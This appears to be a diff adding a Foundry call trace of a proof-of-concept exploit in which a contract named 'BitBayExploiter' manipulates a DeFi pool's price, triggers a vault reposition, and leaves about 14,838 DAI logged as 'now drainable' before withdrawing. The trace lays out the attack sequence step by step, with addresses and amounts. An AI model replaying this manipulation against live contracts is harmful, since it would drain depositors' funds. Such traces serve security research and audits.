+    │   │   │   │   │   @ 0x011c2684a4f2626cdf5de2ae5e443aa2240328da6e6eca9e77717b1d763263e0: 0 → 0x0000000000000000000000000000000000000000000000005bc80091fafe172c
+    │   │   │   │   │   @ 14: 0x0000000000000000000000000000000000000000000000055c1802add1489870 → 0x0000000000000000000000000000000000000000000000055cdeb10bc8ec5a13
+    │   │   │   │   └─ ← [Return] 0x
+    │   │   │   └─ ← [Return] 0x
+    │   │   ├─ emit Deposited(param0: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 1, param2: 1)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x815159e9921130cecaf28ce15344659cf61fa068782f6d37c043ea22c01cdf3c: 0 → 1
+    │   │   │   @ 16: 0x00000000000000000000000000000000000000000000032459afda1bfb97c00b → 0x00000000000000000000000000000000000000000000032459afda1bfb97c00c
+    │   │   └─ ← [Stop]
+    │   ├─ [108251] 0x67366782805870060151383F4BbFF9daB53e5cD6::unlock(0x)
+    │   │   ├─ [106304] BitBayExploiter::unlockCallback(0x)
+    │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 109999999999999999999999 [1.099e23]
+    │   │   │   │   └─ ← [Return] 109999999999999999999999 [1.099e23]
+    │   │   │   ├─ [51352] 0x67366782805870060151383F4BbFF9daB53e5cD6::swap(PoolKey({ currency0: 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, currency1: 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, fee: 50, tickSpacing: 1, hooks: 0x0000000000000000000000000000000000000000 }), SwapParams({ zeroForOne: false, amountSpecified: -109999999999999999999999 [-1.099e23], sqrtPriceLimitX96: 79239942287305395081048711596759672 [7.923e34] }), 0x)
+    │   │   │   │   ├─  emit topic 0: 0x40e9cecb9f5f1f1c5b9c97dec2917b7ee92e57ba5563708daca94dd84ad7112f
+    │   │   │   │   │        topic 1: 0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829
+    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000191bf726f5ffffffffffffffffffffffffffffffffffffffffffffe9289f90b2c1f30fb16400000000000000000000000000000000000f42d4ae7fe13d0906b59e23265a7800000000000000000000000000000000000000000000000305b17f1138d9ffd70000000000000000000000000000000000000000000000000000000000043766000000000000000000000000000000000000000000000000000000000000003f
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x337b5bb0f3cad8438abdf61831c1e7f041ff2ebe7f7fd111d47c12aaa2dcd093: 0x000000000000000000000000000000000000002de757fda1a70258ca775c6eae → 0x000000000000000000000000000000000000008bdd12048480488deebfe9f707
+    │   │   │   │   │   @ 0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f2: 0x000000000000000000000000000444d7717a8081a724cf7398b2238e696ea6d8 → 0x000000000000000000000000000444d772d0f05c5e02461b197ea4a051ba61c2
+    │   │   │   │   │   @ 0x8b2e538b61367ab6db116a167f81f6719b95ca851e61e8f6f696c68dfa6d6197: 0x0000000000000000000000000000000000000000000000161b721fbf3b47161a → 0x0000000000000000000000000000000000000000000000162ee7e6df28ace3f1
+    │   │   │   │   │   @ 0x5a2f712289301a0d2f302f429ca757c29f9fbcf9394f0fdb08b1354081926846: 0x000000000000000000000000000000000000002de9d7fef6ac6bd414353e5ae2 → 0x000000000000000000000000000000000000008bda92032f7adf12a502080ad3
+    │   │   │   │   │   @ 0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f3: 0x0000000000000000000000000000000000000000000001191380f31be4f2c76d → 0x00000000000000000000000000000000000000000000000305b17f1138d9ffd7
+    │   │   │   │   │   @ 0x337b5bb0f3cad8438abdf61831c1e7f041ff2ebe7f7fd111d47c12aaa2dcd094: 0x00000000000000000000000000044443fa56d0a4b0e2d23c793153c31f303b8c → 0x0000000000000000000000000000009377d642f1c9db16090a86e62237358bc9
+    │   │   │   │   │   @ 0x5a2f712289301a0d2f302f429ca757c29f9fbcf9394f0fdb08b1354081926847: 0x00000000000000000000000000044446407faf8546b6e82999a629aadd166f0b → 0x00000000000000000000000000000091310989643830f135ae5081472422f733
+    │   │   │   │   │   @ 0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0: 0x00000000003200d00d04376400000000000f426c2f4cbaa38f5c747e34a3a88f → 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78
+    │   │   │   │   └─ ← [Return] 36697195362125181355602609500854238179217063784804 [3.669e49]
+    │   │   │   ├─ [28836] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 107843364597 [1.078e11])
+    │   │   │   │   ├─ [27263] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transfer(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 107843364597 [1.078e11])
+    │   │   │   │   │   ├─ [26563] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transfer(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 107843364597 [1.078e11]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 107843364597 [1.078e11])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0 → 0x000000000000000000000000000000000000000000000000000000191bf726f5
+    │   │   │   │   │   │   │   @ 0xe90d223b8475c9f5790ad50dcb63db4fa1daef5714db9dc3ca7133fdc5fd7cee: 0x0000000000000000000000000000000000000000000000000000024f1e675431 → 0x0000000000000000000000000000000000000000000000000000023602702d3c
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [2791] 0x67366782805870060151383F4BbFF9daB53e5cD6::sync(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063)
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 795045715955661306212856 [7.95e23]
+    │   │   │   │   │   └─ ← [Return] 795045715955661306212856 [7.95e23]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 107865061456658704649884 [1.078e23])
+    │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 107865061456658704649884 [1.078e23]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x67366782805870060151383F4BbFF9daB53e5cD6, value: 107865061456658704649884 [1.078e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000174b1ca8ab05a8bfffff → 0x000000000000000000000000000000000000000000000073bc395dc79bcfb163
+    │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000a85b83be58f03a8a31f8 → 0x00000000000000000000000000000000000000000000bf32e42da62e477a8094
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [3392] 0x67366782805870060151383F4BbFF9daB53e5cD6::settle()
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 902910777412320010862740 [9.029e23]
+    │   │   │   │   │   └─ ← [Return] 902910777412320010862740 [9.029e23]
+    │   │   │   │   └─ ← [Return] 107865061456658704649884 [1.078e23]
+    │   │   │   └─ ← [Return] 0x
+    │   │   └─ ← [Return] 0x
+    │   ├─  storage changes:
+    │   │   @ 3: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   └─ ← [Return] 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78
+    │   └─ ← [Return] 79239942287305395081048711596759672 [7.923e34], 276326 [2.763e5], 53261 [5.326e4], 50
+    ├─ emit log_named_int(key: "pool tick after push swap", val: 276326 [2.763e5])
+    ├─ [109319] BitBayExploiter::do_reposition(1791512622 [1.791e9])
+    │   ├─ [108429] 0x048E88311ca84876aeA086125825492e2AF2e5A0::reposition(1791512622 [1.791e9])
+    │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78
+    │   │   │   └─ ← [Return] 79239942287305395081048711596759672 [7.923e34], 276326 [2.763e5], 53261 [5.326e4], 50
+    │   │   ├─ [90585] 0x67366782805870060151383F4BbFF9daB53e5cD6::unlock(0x000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   ├─ [88626] 0x048E88311ca84876aeA086125825492e2AF2e5A0::unlockCallback(0x000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78
+    │   │   │   │   │   └─ ← [Return] 79239942287305395081048711596759672 [7.923e34], 276326 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ [8686] 0x67366782805870060151383F4BbFF9daB53e5cD6::modifyLiquidity((0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 50, 1, 0x0000000000000000000000000000000000000000), (276323 [2.763e5], 276326 [2.763e5], 0, 0x0000000000000000000000000000000000000000000000000000000000000001), 0x)
+    │   │   │   │   │   ├─  emit topic 0: 0xf208f4912782fd25c7f114ca3723a2d5dd6f3bcc3ac8db5af63baa85f711d5ec
+    │   │   │   │   │   │        topic 1: 0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000048e88311ca84876aea086125825492e2af2e5a0
+    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000043763000000000000000000000000000000000000000000000000000000000004376600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xddf51250bda266bac01096983189b9134cd40848a7c6599656c30ffb872ec35a: 0x0000000000000000000000000000000598285fbb91ef25f5c0f4dddb53ba6f65 → 0x0000000000000000000000000000000598daf2d065883ec7abfaf43240b18fe2
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000003bda79aaa01dfc100000000000000000000000000000000000000000000000003bda79aaa01dfc1
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 1995283743716464 [1.995e15]
+    │   │   │   │   │   └─ ← [Return] 1995283743716464 [1.995e15]
+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78
+    │   │   │   │   │   └─ ← [Return] 79239942287305395081048711596759672 [7.923e34], 276326 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ [5829] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 67388958857787376 [6.738e16])
+    │   │   │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 67388958857787376 [6.738e16])
+    │   │   │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, 67388958857787376 [6.738e16]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0xE31DcAE0440cBeaF7B1325F41b7fD7DDEbFD9Aef, value: 67388958857787376 [6.738e16])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x58df646bd4076229afa8fe0fedaab6e6e245a50bdc922603e2584dd936123a96: 0x00000000000000000000000000000000000000000000000016f200247ebf85cb → 0x00000000000000000000000000000000000000000000000017e16a0b293ffdbb
+    │   │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000bf32e42da62e477a8094 → 0x00000000000000000000000000000000000000000000bf32e33e3c479cfa08a4
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [6027] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 202166876573362129 [2.021e17])
+    │   │   │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 202166876573362129 [2.021e17])
+    │   │   │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, 202166876573362129 [2.021e17]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c, value: 202166876573362129 [2.021e17])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000bf32e33e3c479cfa08a4 → 0x00000000000000000000000000000000000000000000bf32e06ffe939d78a0d3
+    │   │   │   │   │   │   │   │   @ 0x666a0a2a175e3c128e5ff0edb8f8d92ee7f7485453e2867d672f2e873932369d: 0x000000000000000000000000000000000000000000000001a1ab27e3f48d725c → 0x000000000000000000000000000000000000000000000001a4796597f40eda2d
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ emit FeesCollected(: 0, : 269555835431149505 [2.695e17])
+    │   │   │   │   ├─ [12741] 0x67366782805870060151383F4BbFF9daB53e5cD6::modifyLiquidity((0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 50, 1, 0x0000000000000000000000000000000000000000), (276323 [2.763e5], 276326 [2.763e5], -98925701129040583187 [-9.892e19], 0x0000000000000000000000000000000000000000000000000000000000000001), 0x)
+    │   │   │   │   │   ├─  emit topic 0: 0xf208f4912782fd25c7f114ca3723a2d5dd6f3bcc3ac8db5af63baa85f711d5ec
+    │   │   │   │   │   │        topic 1: 0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829
+    │   │   │   │   │   │        topic 2: 0x000000000000000000000000048e88311ca84876aea086125825492e2af2e5a0
+    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000437630000000000000000000000000000000000000000000000000000000000043766fffffffffffffffffffffffffffffffffffffffffffffffaa3214ef43713a5ed0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x8a76500ba391347340d5b5be6a85d1f5ba8c196ad9c8e8f2c08d922f7fd9ee41: 0x000000000000006d3525a8b34a585943000000000000006d3525a8b34a585943 → 0x0000000000000067d846f7a7816bff300000000000000067d846f7a7816bff30
+    │   │   │   │   │   │   @ 0xddf51250bda266bac01096983189b9134cd40848a7c6599656c30ffb872ec358: 0x0000000000000000000000000000000000000000000000055cdeb10bc8ec5a13 → 0
+    │   │   │   │   │   │   @ 0x337b5bb0f3cad8438abdf61831c1e7f041ff2ebe7f7fd111d47c12aaa2dcd092: 0xffffffffffffffaa5bca5b18f84b7c360000000000000055a435a4e707b483ca → 0xffffffffffffffafb8a90c24c137d64900000000000000504756f3db3ec829b7
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000003246510349c31c552ff0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [6027] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, 0x048E88311ca84876aeA086125825492e2AF2e5A0, 14838464613705392149247 [1.483e22])
+    │   │   │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(0x048E88311ca84876aeA086125825492e2AF2e5A0, 14838464613705392149247 [1.483e22])
+    │   │   │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(0x048E88311ca84876aeA086125825492e2AF2e5A0, 14838464613705392149247 [1.483e22]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: 0x048E88311ca84876aeA086125825492e2AF2e5A0, value: 14838464613705392149247 [1.483e22])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x7132d8df175a4c9f9cd4430f8e40f3fb90cba8eb144bf6376ed27ab250788cde: 0x000000000000000000000000000000000000000000000000000716b332c53470 → 0x00000000000000000000000000000000000000000000032465174b4f648a876f
+    │   │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000bf32e06ffe939d78a0d3 → 0x00000000000000000000000000000000000000000000bc0e7b5fc9f76bb34dd4
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78
+    │   │   │   │   │   └─ ← [Return] 79239942287305395081048711596759672 [7.923e34], 276326 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   │   │   │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   │   │   │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [1446] 0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a::getSlot0(0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829) [staticcall]
+    │   │   │   │   │   ├─ [375] 0x67366782805870060151383F4BbFF9daB53e5cD6::extsload(0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78
+    │   │   │   │   │   └─ ← [Return] 79239942287305395081048711596759672 [7.923e34], 276326 [2.763e5], 53261 [5.326e4], 50
+    │   │   │   │   ├─ emit Repositioned(: 276324 [2.763e5], : 276327 [2.763e5], : 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 13: 0x0000000000000000000000000000000000000000043766043763000001000001 → 0x0000000000000000000000000000000000000000043767043764000001000001
+    │   │   │   │   │   @ 0x011c2684a4f2626cdf5de2ae5e443aa2240328da6e6eca9e77717b1d763263e0: 0x0000000000000000000000000000000000000000000000005bc80091fafe172c → 0x0000000000000000000000000000000000000000000000005f85a82ca4fff6ed
+    │   │   │   │   │   @ 14: 0x0000000000000000000000000000000000000000000000055cdeb10bc8ec5a13 → 0
+    │   │   │   │   └─ ← [Return] 0x
+    │   │   │   └─ ← [Return] 0x
+    │   │   ├─  storage changes:
+    │   │   │   @ 17: 0x000000000000000000000000000000000000000000000000000000006abea7dd → 0x000000000000000000000000000000000000000000000000000000006ac8502e
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [428] 0x048E88311ca84876aeA086125825492e2AF2e5A0::liquidity() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [3679] 0x048E88311ca84876aeA086125825492e2AF2e5A0::getBalances() [staticcall]
+    │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 14838466608989135865711 [1.483e22], 0
+    ├─ emit log_named_uint(key: "vault liquidity after reposition", val: 0)
+    ├─ emit log_named_decimal_uint(key: "vault DAI idle after reposition (now drainable)", val: 14838466608989135865711 [1.483e22], decimals: 18)
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 2134938543341295350115 [2.134e21]
+    │   └─ ← [Return] 2134938543341295350115 [2.134e21]
+    ├─ [37567] BitBayExploiter::do_withdraw(1791512622 [1.791e9])
+    │   ├─ [36276] 0x048E88311ca84876aeA086125825492e2AF2e5A0::withdraw(1, 1791512622 [1.791e9], false)
+    │   │   ├─ [15981] 0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c::removeShares(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
+    │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
+    │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 30298359671420803629 [3.029e19]
+    │   │   │   │   └─ ← [Return] 30298359671420803629 [3.029e19]
+    │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
